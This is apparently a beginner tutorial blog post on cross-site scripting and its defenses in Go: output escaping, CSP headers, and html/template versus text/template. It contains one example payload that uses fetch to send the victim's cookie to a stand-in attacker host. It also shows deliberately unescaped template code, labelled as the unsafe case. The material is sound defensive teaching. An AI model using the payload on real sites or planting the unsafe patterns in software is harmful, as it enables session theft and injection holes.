---
title: "XSS (Cross-Site Scripting) — Escaping Output and CSP"
date: 2026-07-09T10:30:00
summary: "If you render user input into HTML without neutralizing it, the attacker's script runs in the victim's browser. This post sorts out the three XSS variants and the core defense (contextual output escaping + CSP), then covers how Go's html/template protects you by default — and how you can poke a hole in it."
tags: ["セキュリティ", "Go"]
level: beginner
lang: en
translationKey: xss-cross-site-scripting
---

XSS (Cross-Site Scripting) is an attack that **runs the attacker's JavaScript in the victim's browser**.
The cause is almost always one thing: embedding a user-derived string into HTML without neutralizing it.
The conclusion up front: **escape according to where you output (the context), and layer CSP on top as insurance.**

## How the Attack Works — Script Smuggled Into Output

At its core, XSS is a string that gets interpreted as HTML/JS being rendered straight to the page.
It splits into three variants by how the payload gets in.

| Variant | Injection path | Example |
| --- | --- | --- |
| **Reflected** | request → reflected into the immediate response | showing the search term back on the page |
| **Stored** | saved to a DB, etc. → later served to others | planted in a comment field; every viewer is hit |
| **DOM-based** | JS rewrites the DOM without the server | `innerHTML = location.hash` |

For example, on a page that embeds the search keyword without escaping, this input:

```text
"><script>fetch('https://evil.example/steal?c='+document.cookie)</script>
```

causes `<script>` to be interpreted as a real tag inside the output HTML, and
**the victim's cookie (session) gets sent to the attacker**. With stored XSS, everyone who merely views the page is a target.

> ⚠️ The danger isn't the input itself — it's **placing an untrusted string somewhere it can be interpreted as code**.
> This is exactly the same shape as [SQL injection](/en/posts/sql-injection/); the only difference is whether it mixes into SQL or into HTML/JS.

## The Core Principle — Contextual Escaping + CSP

The first principle is **escaping at output time** — and the correct transformation depends on *where* you embed it.

- **HTML body**: convert `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;`
- **Attribute values**: escape `"` and `'` too (so `href="..."` can't be broken out of)
- **Inside `<script>` / URLs / CSS**: the rules differ per context. HTML-escaping a JS string is meaningless

So it isn't "sanitize once and you're safe" — the key is to **escape correctly for each output context**.
On top of that, layer **CSP (Content-Security-Policy) as insurance**. CSP is a header that tells the browser
"which sources are allowed to run scripts," so that even if one escaping gap slips through, it
**stops the inline script from executing at all**.

```text
Content-Security-Policy: default-src 'self'; script-src 'self'
```

## Defense in Go — html/template Protects by Default

Go ships two similarly named template packages. This is the fork in the road.

- `text/template` … embeds strings **as-is**. It does not escape
- `html/template` … same API, but **auto-detects the output context and escapes**

First the dangerous case. Feed user input through `text/template` and `<script>` passes straight through.

```go
// Dangerous: text/template does not escape
package main

import (
	"os"
	"text/template"
)

func main() {
	t := template.Must(template.New("x").Parse(`<p>Hello {{.}}</p>`))
	// The attacker's string becomes HTML verbatim
	t.Execute(os.Stdout, `<script>alert(1)</script>`)
	// Output: <p>Hello <script>alert(1)</script></p>
}
```

Just switching the import to `html/template` makes it safe. The API is identical.

```go
// Safe: html/template auto-escapes based on context
package main

import (
	"html/template"
	"os"
)

func main() {
	t := template.Must(template.New("x").Parse(`<p>Hello {{.}}</p>`))
	t.Execute(os.Stdout, `<script>alert(1)</script>`)
	// Output: <p>Hello &lt;script&gt;alert(1)&lt;/script&gt;</p>
}
```

What makes `html/template` clever is that it **switches the transformation based on context**. The same `{{.}}`
gets HTML-escaped in the HTML body, attribute+URL-escaped in `href="{{.}}"`, and JS-string-escaped inside a
`<script>` — all automatically. The standard library shoulders the "contextual escaping" from the principle above.

> 🧭 C#/ASP.NET Razor follows the same idea: `@model.Name` is HTML-encoded by default.
> To turn encoding off you write `@Html.Raw(...)` explicitly — the "dangerous escape hatch" that corresponds to Go's `template.HTML`.

## Escape Hatches Are Explicit; CSP Is Insurance

When you want to pass raw HTML through `html/template` because "I already escaped it myself," you wrap it in a
**special type** like `template.HTML`. This is an **explicit declaration that escaping is turned off**, and it's
also the single most common entry point for XSS.

```go
// template.HTML is exempt from escaping. Use it only on trusted values
safe := template.HTML(myTrustedSnippet)     // OK: fixed HTML you generated yourself
danger := template.HTML(userInput)          // NG: wrapping user input is instant XSS
```

> 💡 The rule is simple. **Never use `template.HTML` / `Html.Raw` on user-derived values.**
> Use them almost exclusively for "a trusted HTML snippet you assembled yourself."

You can add the CSP header in Go with an ordinary middleware. Escaping is the primary defense, CSP the insurance — defense in depth.

```go
func csp(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'")
		next.ServeHTTP(w, r)
	})
}
```

## Summary

- XSS makes **an untrusted string get interpreted as HTML/JS**. Three variants: reflected, stored, DOM-based
- The core defense is **contextual escaping at output time** — not "sanitize once" but transform correctly per output location
- Go splits sharply into `text/template` (no escaping) and `html/template` (context-aware auto-escaping). **Always use `html/template` to generate web pages**
- `template.HTML` is the escape hatch that turns escaping off. **Never use it on user input** (same caution as Razor's `@Html.Raw`)
- Layer **CSP as insurance** so that even with an escaping gap, inline scripts are blocked — defense in depth

**Related:** [CSRF — Tricking a Victim Into Unintended Requests](/en/posts/csrf-attack/) / [SQL Injection](/en/posts/sql-injection/) / [Session Hijacking and Session Fixation](/en/posts/session-hijacking-fixation/)
